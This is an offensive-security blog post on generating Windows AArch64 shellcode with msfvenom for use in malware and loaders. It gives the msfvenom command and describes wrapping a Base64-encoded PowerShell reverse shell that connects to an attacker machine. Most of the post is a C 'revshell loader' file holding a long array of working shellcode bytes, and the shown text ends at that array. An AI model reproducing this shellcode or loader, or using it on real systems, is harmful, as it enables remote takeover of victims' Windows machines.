---
description: 01/02/2026
cover: https://giffiles.alphacoders.com/120/120216.gif
coverY: 0
---

# ðŸ’½ Msfvenom via Windows AARCH64

## Introduction

This post is dedicated to obtaining Windows AARCH64 shellcode to implement in malware/loaders.

### Metasploit Update(s)

Thanks to the somewhat recent enhancement/addition to Metasploit's module-base, developers have added some AARCH64 support for Windows `msfvenom` development and means of obtaining AARCH64 Windows shellcode.

{% hint style="info" %}
See [here](https://www.rapid7.com/db/modules/payload/windows/aarch64/exec/).

Note: at the time of writing this, this is the only Windows AARCH64-supported module for shellcode I've been able to find.
{% endhint %}

## How-to

**We can access AARCH64 Windows** [**`winexec()`**](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec) **via `msfvenom` by the following command:**

```
msfvenom -p windows/aarch64/exec CMD="<place_windows_cmd_here>" -f c
```

**Where:**

* `-p`: is the target platform
* `CMD`: the command to be executed via `winexec()` Win API
* `-f`: the outputted format (in this case, we will obtain a C-based hex string, containing our shellcode that we can conveniently place in our C "loader"

### Obtain Windows Command

You can easily grab one from [Revshells](https://www.revshells.com/), or you can use your own.

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

In this case, I opted for a Base64-encoded PowerShell command that establishes a reverse shell connection back to my attacker machine.&#x20;

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

As we can see, `msfvenom` went ahead and spat out our AARCH64 shellcode.

**A detailed explanation on how this Windows AARCH64 shellcode works can be found here:**

{% hint style="info" %}
"Executes an arbitrary command on a Windows on ARM (AArch64) target. This payload is a foundational example of position-independent shellcode for the AArch64 architecture. It dynamically resolves the address of the `WinExec` function from `kernel32.dll` by parsing the Process Environment Block (PEB) and the module's Export Address Table (EAT) at runtime. This technique avoids static imports and hardcoded function addresses, increasing resilience."



You might be asking yourself why the shellcode is so large, this is because of the dynamic functionality of the shellcode that must be performed to "walk" memory space for `kernel32.dll` to locate the `WinExec()` function in memory via accessing the `PEB` and `EAT` at runtime.
{% endhint %}



### Building/Configuring C-Loader on the Windows Side

**On our Windows AARCH64 machine, we can use this simple C "loader" to execute our shellcode.**

**`aarch64-revshell-loader.c`:**

```c
#include <stdio.h>
#include <Windows.h>

char shellcode[] =
// your shellcode bytes here
"\xfd\x7b\xb5\xa9\xfd\x03\x00\x91\xb3\x53\x01\xa9\xb5\x13"
"\x00\xf9\x28\x66\x91\x52\xe8\xed\xb0\x72\x4a\x32\x40\xf9"
"\x4a\x0d\x40\xf9\x4a\x11\x40\xf9\x4b\x29\x40\xf9\x4c\x25"
"\x40\xf9\x8c\x3d\x40\x92\x0d\x00\x80\x52\x6e\x15\x40\x38"
"\xdf\x85\x01\x71\x4b\x00\x00\x54\xce\x81\x00\x51\xad\x35"
"\x8d\x13\xad\x01\x0e\x0b\x8c\x05\x00\x51\x9f\x01\x1f\x6b"
"\x0c\xff\xff\x54\xad\x35\x8d\x13\xad\x35\x8d\x13\xaa\x1b"
"\x00\xf9\xad\x3b\x00\xb9\x4a\x11\x40\xf9\x4b\x3d\x40\xb9"
"\x4b\x01\x0b\x8b\x6e\x31\x40\x79\xdf\x2d\x08\x71\xc1\x6f"
"\x00\x54\x6b\x89\x40\xb9\x7f\x01\x00\xf1\x60\x6f\x00\x54"
"\x6b\x01\x0a\x8b\xab\x23\x00\xf9\x6c\x19\x40\xb9\x6d\x21"
"\x40\xb9\x4d\x01\x0d\x8b\x9f\x01\x00\x71\x80\x6e\x00\x54"
"\x8c\x05\x00\x51\x8e\x00\x80\xd2\x8f\x35\x0e\x9b\xef\x01"
"\x40\xb9\x4f\x01\x0f\x8b\x05\x00\x80\xd2\xeb\x15\x40\x38"
"\xa5\x34\x85\x13\xa5\x00\x0b\x0b\x7f\x01\x00\xf1\x81\xff"
"\xff\x54\xa6\x3b\x40\xb9\xc6\x00\x05\x0b\xdf\x00\x08\x6b"
"\x01\xfe\xff\x54\xab\x23\x40\xf9\x6d\x25\x40\xb9\x4d\x01"
"\x0d\x8b\x4e\x00\x80\xd2\x8f\x35\x0e\x9b\xef\x01\x40\x79"
"\x6d\x1d\x40\xb9\x4d\x01\x0d\x8b\x8e\x00\x80\xd2\xef\x35"
"\x0e\x9b\xef\x01\x40\xb9\xef\x01\x0a\x8b\xa9\x43\x01\x91"
"\x00\xee\x8d\xd2\xe0\xae\xac\xf2\x40\x6e\xce\xf2\x00\xad"
"\xec\xf2\x20\x85\x00\xf8\x80\x8d\x8d\xd2\x00\xa4\xa5\xf2"
"\xa0\x0c\xc4\xf2\x40\x29\xe8\xf2\x20\x85\x00\xf8\x40\x48"
"\x8d\xd2\x20\xe8\xa8\xf2\xe0\x2e\xc8\xf2\x20\x2c\xea\xf2"
"\x20\x85\x00\xf8\x40\x88\x8d\xd2\x20\xe8\xa8\xf2\x80\x26"
"\xc8\xf2\x80\x2c\xe8\xf2\x20\x85\x00\xf8\x20\xe8\x8c\xd2"
"\x20\x88\xa8\xf2\x00\x26\xc8\xf2\x20\x29\xe8\xf2\x20\x85"
"\x00\xf8\x40\xe8\x89\xd2\x20\xe8\xa8\xf2\xa0\x2a\xc8\xf2"
"\x80\xec\xee\xf2\x20\x85\x00\xf8\x20\x88\x8e\xd2\x20\xa8"
"\xa8\xf2\x00\x27\xc8\xf2\x20\xeb\xec\xf2\x20\x85\x00\xf8"
"\x40\x28\x8e\xd2\x20\xe8\xa8\xf2\xa0\x2a\xc8\xf2\x20\xeb"
"\xee\xf2\x20\x85\x00\xf8\x40\x08\x86\xd2\x20\x68\xa8\xf2"
"\x20\x28\xc8\xf2\xa0\xea\xee\xf2\x20\x85\x00\xf8\x40\xa8"
"\x86\xd2\x20\x08\xa9\xf2\xa0\x29\xc8\xf2\x80\x2c\xe8\xf2"
"\x20\x85\x00\xf8\x40\x88\x8d\xd2\x20\xe8\xa8\xf2\x00\x26"
"\xc8\xf2\x80\xe9\xec\xf2\x20\x85\x00\xf8\x40\xe8\x89\xd2"
"\x20\xe8\xa8\xf2\xa0\x2a\xc8\xf2\x80\x2c\xe8\xf2\x20\x85"
"\x00\xf8\x20\xa8\x8e\xd2\x20\xc8\xa8\xf2\xa0\x29\xc8\xf2"
"\x40\xec\xee\xf2\x20\x85\x00\xf8\x40\x48\x8d\xd2\x20\xe8"
"\xa8\xf2\x60\x2e\xc8\xf2\x40\x2b\xea\xf2\x20\x85\x00\xf8"
"\x40\x08\x86\xd2\x20\x08\xa9\xf2\xa0\x29\xc8\xf2\x80\xe9"
"\xec\xf2\x20\x85\x00\xf8\x40\xa8\x8a\xd2\x20\xa8\xa8\xf2"
"\xa0\x29\xc8\xf2\xa0\x2a\xe8\xf2\x20\x85\x00\xf8\x40\x88"
"\x88\xd2\x20\xe8\xa8\xf2\xe0\x2e\xc8\xf2\x20\x2c\xea\xf2"
"\x20\x85\x00\xf8\x40\x88\x8d\xd2\x20\xe8\xa8\xf2\x80\x26"
"\xc8\xf2\x80\x2c\xe8\xf2\x20\x85\x00\xf8\x20\xe8\x8d\xd2"
"\x20\x68\xa8\xf2\x20\x29\xc8\xf2\xa0\x29\xea\xf2\x20\x85"
"\x00\xf8\x20\xe8\x8e\xd2\x20\x68\xa8\xf2\x80\x26\xc8\xf2"
"\xa0\xe9\xec\xf2\x20\x85\x00\xf8\x20\x08\x8f\xd2\x20\x88"
"\xa8\xf2\xa0\x28\xc8\xf2\x80\xe9\xec\xf2\x20\x85\x00\xf8"
"\x20\x28\x86\xd2\x20\x88\xa8\xf2\xa0\x2a\xc8\xf2\x80\xe9"
"\xec\xf2\x20\x85\x00\xf8\x20\x28\x86\xd2\x20\x68\xa8\xf2"
"\x20\x29\xc8\xf2\x80\x29\xe8\xf2\x20\x85\x00\xf8\x20\x08"
"\x8f\xd2\x20\x88\xa8\xf2\xa0\x29\xc8\xf2\xa0\xe9\xee\xf2"
"\x20\x85\x00\xf8\x20\x68\x86\xd2\x20\x68\xa8\xf2\x60\x2d"
"\xc8\xf2\xe0\xe9\xee\xf2\x20\x85\x00\xf8\x20\x68\x8d\xd2"
"\x20\x08\xa9\xf2\xa0\x29\xc8\xf2\x80\x2c\xe8\xf2\x20\x85"
"\x00\xf8\x40\x28\x8f\xd2\x20\xe8\xa8\xf2\xa0\x2a\xc8\xf2"
"\x20\x2b\xea\xf2\x20\x85\x00\xf8\x40\x88\x8e\xd2\x20\x68"
"\xa8\xf2\x20\x28\xc8\xf2\x00\x2a\xea\xf2\x20\x85\x00\xf8"
"\x20\xe8\x8c\xd2\x20\x68\xa8\xf2\x20\x2a\xc8\xf2\x20\xeb"
"\xee\xf2\x20\x85\x00\xf8\x40\x68\x8e\xd2\x20\xe8\xa8\xf2"
"\x60\x2d\xc8\xf2\x40\x2b\xea\xf2\x20\x85\x00\xf8\x40\xa8"
"\x8e\xd2\x20\x08\xa9\xf2\x20\x2a\xc8\xf2\x80\xe9\xec\xf2"
"\x20\x85\x00\xf8\x40\x08\x89\xd2\x20\xe8\xa8\xf2\xa0\x2a"
"\xc8\xf2\x80\x2c\xe8\xf2\x20\x85\x00\xf8\x40\x88\x8a\xd2"
"\x20\x08\xa9\xf2\x20\x2a\xc8\xf2\x60\xec\xec\xf2\x20\x85"
"\x00\xf8\x40\x88\x8d\xd2\x20\xe8\xa8\xf2\xa0\x28\xc8\xf2"
"\x40\x2c\xea\xf2\x20\x85\x00\xf8\x20\xe8\x8d\xd2\x20\x68"
"\xa8\xf2\x60\x2d\xc8\xf2\xe0\xe9\xee\xf2\x20\x85\x00\xf8"
"\x40\x48\x8c\xd2\x20\xe8\xa8\xf2\x20\x29\xc8\xf2\xa0\x2c"
"\xea\xf2\x20\x85\x00\xf8\x40\x08\x86\xd2\x20\xe8\xa8\xf2"
"\xa0\x2a\xc8\xf2\xe0\xea\xee\xf2\x20\x85\x00\xf8\x40\x88"
"\x8c\xd2\x20\xc8\xa8\xf2\x00\x26\xc8\xf2\x40\x29\xe8\xf2"
"\x20\x85\x00\xf8\x40\x28\x8d\xd2\x20\x08\xa9\xf2\x60\x2d"
"\xc8\xf2\x80\x2c\xe8\xf2\x20\x85\x00\xf8\x40\x88\x8d\xd2"
"\x20\x08\xa9\xf2\xa0\x29\xc8\xf2\x20\x29\xe8\xf2\x20\x85"
"\x00\xf8\x20\x28\x87\xd2\x20\x68\xa8\xf2\x20\x28\xc8\xf2"
"\xa0\x29\xe8\xf2\x20\x85\x00\xf8\x20\xa8\x8e\xd2\x20\x68"
"\xa8\xf2\x80\x26\xc8\xf2\xc0\xe9\xec\xf2\x20\x85\x00\xf8"
"\x20\x28\x86\xd2\x20\x88\xa8\xf2\xa0\x2a\xc8\xf2\xa0\xe9"
"\xee\xf2\x20\x85\x00\xf8\x20\x28\x86\xd2\x20\x08\xa9\xf2"
"\xe0\x2e\xc8\xf2\x40\x29\xea\xf2\x20\x85\x00\xf8\x40\xe8"
"\x86\xd2\x20\x88\xa8\xf2\x20\x28\xc8\xf2\xc0\x2c\xea\xf2"
"\x20\x85\x00\xf8\x20\xe8\x86\xd2\x20\x08\xa9\xf2\x60\x2c"
"\xc8\xf2\x20\x2c\xe8\xf2\x20\x85\x00\xf8\x40\x08\x8e\xd2"
"\x20\xe8\xa8\xf2\xe0\x2e\xc8\xf2\x40\x2b\xea\xf2\x20\x85"
"\x00\xf8\x20\xe8\x8d\xd2\x20\x68\xa8\xf2\xe0\x2c\xc8\xf2"
"\x40\x29\xe8\xf2\x20\x85\x00\xf8\x40\x08\x8e\xd2\x20\x68"
"\xa8\xf2\x20\x28\xc8\xf2\x00\x2a\xea\xf2\x20\x85\x00\xf8"
"\x20\xe8\x8c\xd2\x20\x68\xa8\xf2\x20\x2a\xc8\xf2\x60\xec"
"\xee\xf2\x20\x85\x00\xf8\x40\x08\x86\xd2\x20\x08\xa9\xf2"
"\x20\x29\xc8\xf2\x40\x2b\xea\xf2\x20\x85\x00\xf8\x40\x08"
"\x8d\xd2\x20\xe8\xa8\xf2\x00\x26\xc8\xf2\x80\xe9\xec\xf2"
"\x20\x85\x00\xf8\x40\x68\x8a\xd2\x20\xe8\xa8\xf2\xa0\x2a"
"\xc8\xf2\x20\x2b\xea\xf2\x20\x85\x00\xf8\x40\x68\x8d\xd2"
"\x20\x68\xa8\xf2\xe0\x2c\xc8\xf2\x40\x29\xe8\xf2\x20\x85"
"\x00\xf8\x40\x28\x8d\xd2\x20\x08\xa9\xf2\x60\x2d\xc8\xf2"
"\x80\x2c\xe8\xf2\x20\x85\x00\xf8\x40\x88\x8d\xd2\x20\x08"
"\xa9\xf2\xa0\x29\xc8\xf2\x80\x29\xe8\xf2\x20\x85\x00\xf8"
"\x20\xe8\x8c\xd2\x20\x88\xa8\xf2\x20\x28\xc8\xf2\x80\x29"
"\xe8\xf2\x20\x85\x00\xf8\x20\xe8\x8c\xd2\x20\x68\xa8\xf2"
"\x20\x2a\xc8\xf2\x20\xeb\xec\xf2\x20\x85\x00\xf8\x40\xa8"
"\x86\xd2\x20\x08\xa9\xf2\x20\x2a\xc8\xf2\x40\x2b\xea\xf2"
"\x20\x85\x00\xf8\x40\x48\x8f\xd2\x20\x68\xa8\xf2\x80\x26"
"\xc8\xf2\x80\x2a\xe8\xf2\x20\x85\x00\xf8\x40\x88\x8d\xd2"
"\x20\xe8\xa8\xf2\x80\x26\xc8\xf2\x40\xeb\xee\xf2\x20\x85"
"\x00\xf8\x40\x08\x86\xd2\x20\xe8\xa8\xf2\xe0\x2c\xc8\xf2"
"\x60\x29\xea\xf2\x20\x85\x00\xf8\x20\x08\x8e\xd2\x20\x68"
"\xa8\xf2\x20\x28\xc8\xf2\x80\x29\xea\xf2\x20\x85\x00\xf8"
"\x40\xa8\x8e\xd2\x20\xe8\xa8\xf2\xa0\x2a\xc8\xf2\x20\x29"
"\xe8\xf2\x20\x85\x00\xf8\x20\xe8\x8e\xd2\x20\x68\xa8\xf2"
"\x60\x2d\xc8\xf2\xa0\xec\xee\xf2\x20\x85\x00\xf8\x20\xe8"
"\x86\xd2\x20\x68\xa8\xf2\x20\x2a\xc8\xf2\x40\x2b\xe8\xf2"
"\x20\x85\x00\xf8\x40\x08\x8d\xd2\x20\x08\xa9\xf2\x20\x2a"
"\xc8\xf2\x20\x2b\xea\xf2\x20\x85\x00\xf8\x20\xe8\x8c\xd2"
"\x20\x88\xa8\xf2\x00\x26\xc8\xf2\x20\x29\xe8\xf2\x20\x85"
"\x00\xf8\x20\xe8\x8d\xd2\x20\xa8\xa8\xf2\x80\x26\xc8\xf2"
"\x40\x2b\xea\xf2\x20\x85\x00\xf8\x40\x68\x86\xd2\x20\x68"
"\xa8\xf2\x00\x26\xc8\xf2\x80\xea\xee\xf2\x20\x85\x00\xf8"
"\x40\x28\x8d\xd2\x20\xe8\xa8\xf2\xe0\x2d\xc8\xf2\x40\x2b"
"\xea\xf2\x20\x85\x00\xf8\x40\x48\x8d\xd2\x20\x08\xa9\xf2"
"\x20\x2a\xc8\xf2\x20\x29\xe8\xf2\x20\x85\x00\xf8\x20\x88"
"\x8e\xd2\x20\xc8\xa8\xf2\x20\x2a\xc8\xf2\xa0\x2c\xea\xf2"
"\x20\x85\x00\xf8\x40\xe8\x8e\xd2\x20\xe8\xa8\xf2\xa0\x2a"
"\xc8\xf2\x80\xea\xec\xf2\x20\x85\x00\xf8\x40\x08\x8d\xd2"
"\x20\xe8\xa8\xf2\x00\x26\xc8\xf2\x40\x2b\xea\xf2\x20\x85"
"\x00\xf8\x20\xe8\x8c\xd2\x20\xc8\xa8\xf2\xa0\x29\xc8\xf2"
"\xa0\x2c\xea\xf2\x20\x85\x00\xf8\x40\x48\x8f\xd2\x20\x08"
"\xa9\xf2\x20\x2a\xc8\xf2\x40\x2b\xea\xf2\x20\x85\x00\xf8"
"\x40\x88\x8e\xd2\x20\x68\xa8\xf2\x80\x26\xc8\xf2\xc0\x2a"
"\xe8\xf2\x20\x85\x00\xf8\x40\x88\x8d\xd2\x20\x08\xa9\xf2"
"\xe0\x2c\xc8\xf2\x80\x2c\xe8\xf2\x20\x85\x00\xf8\x20\xa8"
"\x8e\xd2\x20\xa8\xa8\xf2\xa0\x28\xc8\xf2\xa0\xea\xee\xf2"
"\x20\x85\x00\xf8\x40\x88\x88\xd2\x20\xa8\xa8\xf2\x60\x2d"
"\xc8\xf2\x60\x2a\xea\xf2\x20\x85\x00\xf8\x40\xc8\x88\xd2"
"\x20\xe8\xa8\xf2\x80\x26\xc8\xf2\x20\xeb\xee\xf2\x20\x85"
"\x00\xf8\x40\xc8\x8e\xd2\x20\xe8\xa8\xf2\x20\x2a\xc8\xf2"
"\x20\x2c\xea\xf2\x20\x85\x00\xf8\x40\xa8\x8e\xd2\x20\xe8"
"\xa8\xf2\x60\x2c\xc8\xf2\x60\x29\xea\xf2\x20\x85\x00\xf8"
"\x20\xa8\x8e\xd2\x20\xa8\xa8\xf2\x60\x2c\xc8\xf2\x40\x2b"
"\xea\xf2\x20\x85\x00\xf8\x40\x08\x86\xd2\x20\xc8\xa8\xf2"
"\xa0\x29\xc8\xf2\x80\x2c\xe8\xf2\x20\x85\x00\xf8\x40\x28"
"\x8f\xd2\x20\xe8\xa8\xf2\x60\x2d\xc8\xf2\x40\xec\xec\xf2"
"\x20\x85\x00\xf8\x40\xc8\x8d\xd2\x20\x68\xa8\xf2\xe0\x2c"
"\xc8\xf2\x40\x29\xe8\xf2\x20\x85\x00\xf8\x40\x28\x8d\xd2"
"\x20\x08\xa9\xf2\x60\x2d\xc8\xf2\x80\x2c\xe8\xf2\x20\x85"
"\x00\xf8\x40\x88\x8d\xd2\x20\x08\xa9\xf2\xa0\x29\xc8\xf2"
"\x80\x29\xe8\xf2\x20\x85\x00\xf8\x20\xe8\x8e\xd2\x20\x68"
"\xa8\xf2\xe0\x2e\xc8\xf2\x20\x29\xe8\xf2\x20\x85\x00\xf8"
"\x20\x68\x8d\xd2\x20\xe8\xa8\xf2\x60\x2d\xc8\xf2\x60\x29"
"\xea\xf2\x20\x85\x00\xf8\x20\xe8\x86\xd2\x20\x68\xa8\xf2"
"\x20\x2a\xc8\xf2\x60\xec\xee\xf2\x20\x85\x00\xf8\x40\x88"
"\x8d\xd2\x20\xe8\xa8\xf2\x80\x26\xc8\xf2\x40\x2b\xe8\xf2"
"\x20\x85\x00\xf8\x40\x28\x8d\xd2\x20\xe8\xa8\xf2\xa0\x28"
"\xc8\xf2\x20\xeb\xee\xf2\x20\x85\x00\xf8\x40\x48\x8e\xd2"
"\x20\x68\xa8\xf2\x20\x28\xc8\xf2\x00\x2a\xea\xf2\x20\x85"
"\x00\xf8\x20\xe8\x8c\xd2\x20\x68\xa8\xf2\xe0\x2c\xc8\xf2"
"\x20\x2c\xea\xf2\x20\x85\x00\xf8\x40\x88\x8d\xd2\x20\x08"
"\xa9\xf2\xe0\x2c\xc8\xf2\x20\x29\xe8\xf2\x20\x85\x00\xf8"
"\x20\x68\x8d\xd2\x20\xe8\xa8\xf2\x20\x2a\xc8\xf2\x20\x2b"
"\xea\xf2\x20\x85\x00\xf8\x40\x08\x86\xd2\x20\xe8\xa8\xf2"
"\xa0\x28\xc8\xf2\x20\x29\xe8\xf2\x20\x85\x00\xf8\x20\x28"
"\x8f\xd2\x20\x88\xa8\xf2\x80\x26\xc8\xf2\x40\xe9\xec\xf2"
"\x20\x85\x00\xf8\x20\x08\x8f\xd2\x20\x68\xa8\xf2\x20\x28"
"\xc8\xf2\xc0\x2c\xe8\xf2\x20\x85\x00\xf8\x20\xe8\x8c\xd2"
"\x20\xa8\xa8\xf2\x00\x27\xc8\xf2\x80\x2c\xea\xf2\x20\x85"
"\x00\xf8\x40\x08\x86\xd2\x20\x68\xa8\xf2\x00\x26\xc8\xf2"
"\xa0\xea\xee\xf2\x20\x85\x00\xf8\x40\x08\x86\xd2\x20\x08"
"\xa9\xf2\x20\x29\xc8\xf2\x20\x2c\xea\xf2\x20\x85\x00\xf8"
"\x40\xa8\x8e\xd2\x20\xe8\xa8\xf2\x60\x2c\xc8\xf2\x20\x29"
"\xe8\xf2\x20\x85\x00\xf8\x20\x08\x8e\xd2\x20\x88\xa8\xf2"
"\x60\x2e\xc8\xf2\x40\x29\xe8\xf2\x20\x85\x00\xf8\x40\x48"
"\x8f\xd2\x20\xe8\xa8\xf2\xa0\x2a\xc8\xf2\x40\xec\xec\xf2"
"\x20\x85\x00\xf8\x40\x68\x8d\xd2\x20\xe8\xa8\xf2\x20\x29"
"\xc8\xf2\x20\x2b\xea\xf2\x20\x85\x00\xf8\x40\x48\x8d\xd2"
"\x20\xe8\xa8\xf2\x60\x2e\xc8\xf2\xa0\xe9\xec\xf2\x20\x85"
"\x00\xf8\x20\xe8\x8c\xd2\x20\x88\xa8\xf2\x00\x26\xc8\xf2"
"\x20\x29\xe8\xf2\x20\x85\x00\xf8\x20\x68\x8d\xd2\x20\x08"
"\xa9\xf2\xa0\x29\xc8\xf2\x40\x2b\xea\xf2\x20\x85\x00\xf8"
"\x40\xa8\x8e\xd2\x20\xe8\xa8\xf2\x20\x2a\xc8\xf2\x20\xeb"
"\xec\xf2\x20\x85\x00\xf8\x40\x08\x8d\xd2\x20\xe8\xa8\xf2"
"\xa0\x29\xc8\xf2\x20\xec\xee\xf2\x20\x85\x00\xf8\x20\xe8"
"\x8c\xd2\x20\x68\xa8\xf2\x60\x2e\xc8\xf2\x20\x29\xe8\xf2"
"\x20\x85\x00\xf8\x20\x28\x8d\xd2\x20\xc8\xa8\xf2\x20\x28"
"\xc8\xf2\xa0\xea\xee\xf2\x20\x85\x00\xf8\x20\xe8\x8c\xd2"
"\x20\x68\xa8\xf2\x20\x29\xc8\xf2\x20\x29\xe8\xf2\x20\x85"
"\x00\xf8\x20\x48\x8e\xd2\x20\x68\xa8\xf2\x20\x28\xc8\xf2"
"\x60\x29\xe8\xf2\x20\x85\x00\xf8\x40\xe8\x8e\xd2\x20\x08"
"\xa9\xf2\x60\x2c\xc8\xf2\x40\x2b\xe8\xf2\x20\x85\x00\xf8"
"\x20\x08\x8e\xd2\x20\x68\xa8\xf2\x80\x26\xc8\xf2\xa0\x2a"
"\xe8\xf2\x20\x85\x00\xf8\x40\x08\x8d\xd2\x20\x08\xa9\xf2"
"\x20\x2a\xc8\xf2\x20\x2c\xe8\xf2\x20\x85\x00\xf8\x20\xe8"
"\x8c\xd2\x20\x68\xa8\xf2\x60\x2e\xc8\xf2\x20\x29\xe8\xf2"
"\x20\x85\x00\xf8\x20\x28\x8d\xd2\x20\x88\xa8\xf2\x80\x26"
"\xc8\xf2\x20\x29\xe8\xf2\x20\x85\x00\xf8\x20\x28\x8d\xd2"
"\x20\x88\xa8\xf2\x60\x2e\xc8\xf2\x40\x29\xe8\xf2\x20\x85"
"\x00\xf8\x40\x48\x8f\xd2\x20\xe8\xa8\xf2\xa0\x2a\xc8\xf2"
"\x40\xec\xec\xf2\x20\x85\x00\xf8\x40\x68\x8d\xd2\x20\xe8"
"\xa8\xf2\x20\x29\xc8\xf2\xa0\x2c\xea\xf2\x20\x85\x00\xf8"
"\x40\x08\x86\xd2\x20\xe8\xa8\xf2\xa0\x2a\xc8\xf2\x20\x29"
"\xe8\xf2\x20\x85\x00\xf8\x20\x28\x87\xd2\x20\x68\xa8\xf2"
"\x20\x28\xc8\xf2\x60\x29\xe8\xf2\x20\x85\x00\xf8\x40\x48"
"\x8c\xd2\x20\x08\xa9\xf2\x20\x2a\xc8\xf2\x40\x2b\xea\xf2"
"\x20\x85\x00\xf8\x40\x88\x86\xd2\x20\x08\xa9\xf2\x20\x2a"
"\xc8\xf2\x80\xe9\xec\xf2\x20\x85\x00\xf8\x40\x88\x8d\xd2"
"\x20\xe8\xa8\xf2\x80\x26\xc8\xf2\x20\xeb\xee\xf2\x20\x85"
"\x00\xf8\x40\xc8\x8e\xd2\x20\xe8\xa8\xf2\x20\x2a\xc8\xf2"
"\x20\x2c\xea\xf2\x20\x85\x00\xf8\x40\xa8\x8e\xd2\x20\xe8"
"\xa8\xf2\x60\x2c\xc8\xf2\x00\x2b\xea\xf2\x20\x85\x00\xf8"
"\x20\xc8\x86\xd2\x20\x88\xa8\xf2\xe0\x2d\xc8\xf2\x20\x2a"
"\xea\xf2\x20\x85\x00\xf8\x40\x88\x8a\xd2\x20\xa8\xa8\xf2"
"\xa0\x29\xc8\xf2\x60\x2a\xea\xf2\x20\x85\x00\xf8\x40\x48"
"\x89\xd2\x20\x68\xa8\xf2\x60\x2d\xc8\xf2\x80\xe9\xec\xf2"
"\x20\x85\x00\xf8\x40\x08\x89\xd2\x20\xe8\xa8\xf2\xa0\x2a"
"\xc8\xf2\x80\x2c\xe8\xf2\x20\x85\x00\xf8\x40\x68\x88\xd2"
"\x20\x08\xa9\xf2\x60\x2d\xc8\xf2\x80\x2c\xe8\xf2\x20\x85"
"\x00\xf8\x40\x88\x8d\xd2\x20\x08\xa9\xf2\xa0\x29\xc8\xf2"
"\x60\x29\xe8\xf2\x20\x85\x00\xf8\x20\x68\x8d\xd2\x20\x08"
"\xa9\xf2\xa0\x29\xc8\xf2\x40\x2b\xea\xf2\x20\x85\x00\xf8"
"\x40\xa8\x8e\xd2\x20\xe8\xa8\xf2\x20\x2a\xc8\xf2\x20\xeb"
"\xec\xf2\x20\x85\x00\xf8\x40\x08\x8d\xd2\x20\xe8\xa8\xf2"
"\xa0\x29\xc8\xf2\x20\xec\xee\xf2\x20\x85\x00\xf8\x20\x28"
"\x8f\xd2\x20\x68\xa8\xf2\x60\x2d\xc8\xf2\xe0\xe9\xee\xf2"
"\x20\x85\x00\xf8\x20\x68\x8d\xd2\x20\x08\xa9\xf2\xa0\x29"
"\xc8\xf2\x80\x2c\xe8\xf2\x20\x85\x00\xf8\x40\x28\x8f\xd2"
"\x20\xe8\xa8\xf2\xa0\x2a\xc8\xf2\x20\x2b\xea\xf2\x20\x85"
"\x00\xf8\x40\x88\x8e\xd2\x20\x68\xa8\xf2\x80\x26\xc8\xf2"
"\xc0\xea\xee\xf2\x20\x85\x00\xf8\x40\x28\x8f\xd2\x20\xe8"
"\xa8\xf2\x60\x2d\xc8\xf2\x80\x2c\xe8\xf2\x20\x85\x00\xf8"
"\x40\x88\x8d\xd2\x20\x68\xa8\xf2\xe0\x2c\xc8\xf2\x40\x29"
"\xe8\xf2\x20\x85\x00\xf8\x40\x48\x8f\xd2\x20\xe8\xa8\xf2"
"\xa0\x2a\xc8\xf2\x40\xec\xec\xf2\x20\x85\x00\xf8\x40\x68"
"\x8d\xd2\x20\xe8\xa8\xf2\x20\x29\xc8\xf2\xa0\x2c\xea\xf2"
"\x20\x85\x00\xf8\x40\x08\x86\xd2\x20\xe8\xa8\xf2\xa0\x2a"
"\xc8\xf2\x80\x29\xe8\xf2\x20\x85\x00\xf8\x20\xe8\x8e\xd2"
"\x20\x68\xa8\xf2\xe0\x2e\xc8\xf2\x40\x29\xe8\xf2\x20\x85"
"\x00\xf8\x40\x48\x8f\xd2\x20\xe8\xa8\xf2\xa0\x2a\xc8\xf2"
"\x40\xec\xec\xf2\x20\x85\x00\xf8\x40\x68\x8d\xd2\x20\xe8"
"\xa8\xf2\x20\x29\xc8\xf2\xa0\x2c\xea\xf2\x20\x85\x00\xf8"
"\x40\x08\x86\xd2\x20\xe8\xa8\xf2\xa0\x2a\xc8\xf2\x80\xe9"
"\xec\xf2\x20\x85\x00\xf8\x40\xa8\x89\xd2\x20\xe8\xa8\xf2"
"\xa0\x2a\xc8\xf2\x40\xec\xec\xf2\x20\x85\x00\xf8\x40\xc8"
"\x8d\xd2\x20\x08\xa9\xf2\x20\x2a\xc8\xf2\x20\x2c\xe8\xf2"
"\x20\x85\x00\xf8\x20\x08\x8e\xd2\x20\x88\xa8\xf2\x60\x2e"
"\xc8\xf2\x40\x29\xe8\xf2\x20\x85\x00\xf8\x40\x48\x8f\xd2"
"\x20\x08\xa9\xf2\x20\x2a\xc8\xf2\x60\xec\xec\xf2\x20\x85"
"\x00\xf8\x40\x88\x8d\xd2\x20\xe8\xa8\xf2\xa0\x28\xc8\xf2"
"\x40\x2c\xea\xf2\x20\x85\x00\xf8\x20\xa8\x8e\xd2\x20\xa8"
"\xa8\xf2\x20\x2b\xc8\xf2\x40\x2c\xe8\xf2\x20\x85\x00\xf8"
"\x40\x28\x86\xd2\x20\x08\xa9\xf2\xa0\x29\xc8\xf2\x20\x2c"
"\xe8\xf2\x20\x85\x00\xf8\x20\xe8\x8d\xd2\x20\x68\xa8\xf2"
"\x60\x2d\xc8\xf2\xc0\x2c\xea\xf2\x20\x85\x00\xf8\x20\xe8"
"\x86\xd2\x20\x68\xa8\xf2\x20\x2a\xc8\xf2\x20\xeb\xee\xf2"
"\x20\x85\x00\xf8\x40\x68\x8e\xd2\x20\xe8\xa8\xf2\x60\x2d"
"\xc8\xf2\x40\x2b\xea\xf2\x20\x85\x00\xf8\x40\xa8\x8e\xd2"
"\x20\x08\xa9\xf2\x20\x2a\xc8\xf2\x80\xe9\xec\xf2\x20\x85"
"\x00\xf8\x40\x88\x88\xd2\x20\xe8\xa8\xf2\xe0\x2e\xc8\xf2"
"\x40\xec\xee\xf2\x20\x85\x00\xf8\x40\x48\x8f\xd2\x20\xe8"
"\xa8\xf2\xa0\x2a\xc8\xf2\x60\x29\xe8\xf2\x20\x85\x00\xf8"
"\x20\x08\x8e\xd2\x20\x28\xa8\xf2\xa0\xa7\xc7\xf2\x00\x00"
"\xe0\xf2\x20\x85\x00\xf8\xe0\x03\x09\xaa\x00\x20\x15\xd1"
"\x21\x00\x80\x52\xe8\x03\x0f\xaa\x00\x01\x3f\xd6\xb3\x53"
"\x41\xa9\xb5\x13\x40\xf9\xbf\x03\x00\x91\xfd\x7b\xcb\xa8"
